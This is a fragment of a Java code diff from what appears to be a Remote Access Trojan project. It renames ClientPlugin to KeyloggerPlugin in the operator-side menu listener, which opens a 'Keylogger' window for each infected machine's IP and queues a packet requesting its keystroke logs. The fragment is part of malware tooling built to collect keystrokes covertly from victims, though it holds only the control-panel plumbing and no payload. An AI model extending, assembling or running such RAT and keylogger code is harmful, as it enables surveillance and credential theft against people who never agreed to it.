@@ -23,11 +23,11 @@ public class MenuListener implements RATMenuItemActionListener {
 				final RATObject server = servers.get(0);
 				BaseControlPanel panel = null;
 
-				if (ClientPlugin.entry.instances.containsKey(server.getIP())) {
-					panel = ClientPlugin.entry.instances.get(server.getIP());
+				if (KeyloggerPlugin.entry.instances.containsKey(server.getIP())) {
+					panel = KeyloggerPlugin.entry.instances.get(server.getIP());
 				} else {
-					panel = ClientPlugin.entry.newPanelInstance(server);
-					ClientPlugin.entry.instances.put(server.getIP(), panel);
+					panel = KeyloggerPlugin.entry.newPanelInstance(server);
+					KeyloggerPlugin.entry.instances.put(server.getIP(), panel);
 				}
 				
 				final BaseControlPanel finalPanel = panel;
@@ -37,19 +37,19 @@ public class MenuListener implements RATMenuItemActionListener {
 					@Override
 					public void windowClosing(WindowEvent arg0) {
 						finalPanel.onClose();
-						ClientPlugin.entry.instances.remove(server.getIP());
+						KeyloggerPlugin.entry.instances.remove(server.getIP());
 					}
 				});
 				frame.setTitle("Keylogger - " + server.getIP());
 				frame.setSize(750, 400);
 				frame.setLocationRelativeTo(null);
-				frame.setIconImage(new ImageIcon(ClientPlugin.ICON_LOCATION).getImage());
+				frame.setIconImage(new ImageIcon(KeyloggerPlugin.ICON_LOCATION).getImage());
 				frame.setLocationRelativeTo(null);
 				frame.add(panel);
 				frame.setVisible(true);
 				
 				try {
-					server.addToSendQueue(new PacketBuilder(ClientPlugin.LOGS_HEADER, server) {
+					server.addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOGS_HEADER, server) {
 						@Override
 						public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {						
 							
